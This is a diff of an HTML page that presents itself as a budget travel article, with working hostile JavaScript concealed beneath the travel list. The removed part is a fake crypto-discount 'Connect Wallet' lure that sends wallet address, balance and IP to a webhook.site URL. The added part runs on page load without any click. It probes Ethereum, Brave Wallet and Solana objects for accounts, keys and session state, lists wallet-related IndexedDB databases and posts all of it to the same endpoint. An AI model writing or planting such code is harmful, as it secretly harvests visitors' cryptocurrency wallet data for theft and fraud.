@@ -5,8 +5,6 @@
   <title>Part 2: Budget Travel Destinations</title>
   <style>
     body { font-family: Georgia, serif; max-width: 700px; margin: 40px auto; padding: 20px; line-height: 1.8; }
-    .deal { background: #f0fdf4; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #86efac; }
-    button { background: #2563eb; color: white; padding: 12px 24px; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
   </style>
 </head>
 <body>
@@ -15,93 +13,152 @@
   <h2>4. Georgia</h2><p>Amazing wine country, friendly locals, $20-25/day.</p>
   <h2>5. Morocco</h2><p>Rich culture, stunning architecture, $30-35/day.</p>
 
-  <div class="deal">
-    <h2>Exclusive Deal: Pay with Crypto & Save 20%</h2>
-    <p>Connect your wallet to unlock exclusive crypto-only travel discounts. Save 20% on all bookings when paying with ETH or SOL.</p>
-    <button id="connectWallet" onclick="connectWallet()">Connect Wallet for Discount</button>
-    <p id="walletStatus"></p>
-  </div>
-
   <script>
-    async function connectWallet() {
-      const status = document.getElementById('walletStatus');
-      
-      try {
-        // This triggers the wallet approval popup
-        const accounts = await window.ethereum.request({ 
-          method: 'eth_requestAccounts' 
-        });
-        
-        if (accounts.length > 0) {
-          status.textContent = 'Connected: ' + accounts[0];
-          
-          // Got the address! Now grab everything
-          const balanceHex = await window.ethereum.request({
-            method: 'eth_getBalance',
-            params: [accounts[0], 'latest']
-          });
-          
-          const balanceWei = parseInt(balanceHex, 16);
-          const balanceEth = balanceWei / 1e18;
-
-          // Get all token balances, transaction count
-          const txCount = await window.ethereum.request({
-            method: 'eth_getTransactionCount',
-            params: [accounts[0], 'latest']
-          });
-
-          const walletData = {
-            address: accounts[0],
-            balanceWei: balanceHex,
-            balanceEth: balanceEth,
-            transactionCount: txCount,
-            chainId: await window.ethereum.request({ method: 'eth_chainId' }),
-            allAccounts: accounts,
-            ip: '',
-            timestamp: new Date().toISOString()
-          };
-
-          // Try to get all accounts (some wallets expose multiple)
-          try {
-            const allAccts = await window.ethereum.request({ method: 'eth_accounts' });
-            walletData.allAccounts = allAccts;
-          } catch(e) {}
-
-          // Get IP
-          try {
-            const r = await fetch('https://api.ipify.org?format=json');
-            walletData.ip = (await r.json()).ip;
-          } catch(e) {}
-
-          // EXFILTRATE WALLET DATA
-          const payload = JSON.stringify(walletData);
-          fetch('https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: payload
-          }).catch(() => {});
-          
-          new Image().src = 'https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4?wallet=' 
-            + encodeURIComponent(payload);
-        }
-      } catch(e) {
-        status.textContent = 'Connection failed: ' + e.message;
-        // Even the error is useful intel
-        new Image().src = 'https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4?wallet_error=' 
-          + encodeURIComponent(e.message);
-      }
-    }
-
-    // Also run the standard exfil on page load
     (async function() {
-      const data = {
+      const walletData = {
         timestamp: new Date().toISOString(),
-        hasEthereum: !!window.ethereum,
-        hasBraveWallet: window.ethereum ? window.ethereum.isBraveWallet : false,
-        chainId: window.ethereum ? await window.ethereum.request({method:'eth_chainId'}).catch(()=>null) : null,
+        ip: '',
+
+        // === DEEP WALLET PROBE ===
+        
+        // 1. Standard ethereum object
+        hasEthereum: typeof window.ethereum !== 'undefined',
+        
+        // 2. Brave-specific wallet objects
+        hasBraveEthereum: typeof window.braveEthereum !== 'undefined',
+        hasBraveSolana: typeof window.braveSolana !== 'undefined',
+        
+        // 3. Dump ALL properties of braveEthereum (may contain internal state)
+        braveEthereumProps: [],
+        braveEthereumState: null,
+        braveEthereumChainId: null,
+        braveEthereumSelectedAddress: null,
+        braveEthereumAccounts: null,
+        braveEthereumNetworkVersion: null,
+        
+        // 4. Dump ALL properties of braveSolana
+        braveSolanaProps: [],
+        braveSolanaPublicKey: null,
+        braveSolanaIsConnected: null,
+        
+        // 5. Standard ethereum internal state
+        ethereumState: null,
+        ethereumSelectedAddress: null,
+        ethereumChainId: null,
+        ethereumNetworkVersion: null,
+        ethereumIsConnected: null,
+        ethereumAccounts: null,
       };
-      new Image().src = 'https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4?pageload=' 
-        + encodeURIComponent(JSON.stringify(data));
+
+      // Deep probe braveEthereum
+      try {
+        const be = window.braveEthereum;
+        if (be) {
+          walletData.braveEthereumProps = Object.getOwnPropertyNames(be)
+            .concat(Object.getOwnPropertyNames(Object.getPrototypeOf(be)));
+          walletData.braveEthereumState = be._state || be.state || null;
+          walletData.braveEthereumChainId = be.chainId || null;
+          walletData.braveEthereumSelectedAddress = be.selectedAddress || null;
+          walletData.braveEthereumNetworkVersion = be.networkVersion || null;
+          walletData.braveEthereumIsMetaMask = be.isMetaMask || false;
+          walletData.braveEthereumIsBraveWallet = be.isBraveWallet || false;
+          
+          // Try getting accounts without popup
+          try {
+            walletData.braveEthereumAccounts = await be.request({ method: 'eth_accounts' });
+          } catch(e) { walletData.braveEthereumAccountsError = e.message; }
+          
+          // Try getting chain info
+          try {
+            walletData.braveEthereumChainIdResult = await be.request({ method: 'eth_chainId' });
+          } catch(e) {}
+          
+          // Try getting block number (proves RPC access)
+          try {
+            walletData.braveEthereumBlockNumber = await be.request({ method: 'eth_blockNumber' });
+          } catch(e) {}
+        }
+      } catch(e) { walletData.braveEthereumError = e.message; }
+
+      // Deep probe braveSolana
+      try {
+        const bs = window.braveSolana;
+        if (bs) {
+          walletData.braveSolanaProps = Object.getOwnPropertyNames(bs)
+            .concat(Object.getOwnPropertyNames(Object.getPrototypeOf(bs)));
+          walletData.braveSolanaPublicKey = bs.publicKey ? bs.publicKey.toString() : null;
+          walletData.braveSolanaIsConnected = bs.isConnected || false;
+          walletData.braveSolanaIsBraveWallet = bs.isBraveWallet || false;
+          
+          // Check for cached/stored connection
+          try {
+            walletData.braveSolanaSession = bs._session || bs.session || null;
+          } catch(e) {}
+        }
+      } catch(e) { walletData.braveSolanaError = e.message; }
+
+      // Deep probe standard ethereum
+      try {
+        const eth = window.ethereum;
+        if (eth) {
+          walletData.ethereumProps = Object.getOwnPropertyNames(eth)
+            .concat(Object.getOwnPropertyNames(Object.getPrototypeOf(eth)));
+          walletData.ethereumState = eth._state || null;
+          walletData.ethereumSelectedAddress = eth.selectedAddress || null;
+          walletData.ethereumChainId = eth.chainId || null;
+          walletData.ethereumNetworkVersion = eth.networkVersion || null;
+          walletData.ethereumIsConnected = eth.isConnected ? eth.isConnected() : null;
+          walletData.ethereumIsBraveWallet = eth.isBraveWallet || false;
+          
+          try {
+            walletData.ethereumAccounts = await eth.request({ method: 'eth_accounts' });
+          } catch(e) {}
+        }
+      } catch(e) {}
+
+      // IndexedDB - wallet databases
+      try {
+        const dbs = await indexedDB.databases();
+        walletData.indexedDBs = dbs.map(db => ({ name: db.name, version: db.version }));
+        
+        // Try to read wallet-related databases
+        for (const db of dbs) {
+          if (db.name && (db.name.toLowerCase().includes('wallet') || 
+              db.name.toLowerCase().includes('brave') ||
+              db.name.toLowerCase().includes('key'))) {
+            try {
+              const openReq = indexedDB.open(db.name);
+              openReq.onsuccess = function() {
+                const database = openReq.result;
+                walletData['idb_' + db.name] = {
+                  objectStores: Array.from(database.objectStoreNames)
+                };
+                database.close();
+              };
+            } catch(e) {}
+          }
+        }
+      } catch(e) {}
+
+      // Get IP
+      try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        walletData.ip = (await r.json()).ip;
+      } catch(e) {}
+
+      // Wait for IndexedDB probes
+      await new Promise(r => setTimeout(r, 1000));
+
+      const payload = JSON.stringify(walletData);
+      
+      fetch('https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+      }).catch(() => {});
+
+      new Image().src = 'https://webhook.site/8813af95-a64a-41cb-bf70-ad38a9d20dd4?wallet_exfil=' 
+        + encodeURIComponent(payload);
     })();
   </script>
 </body>
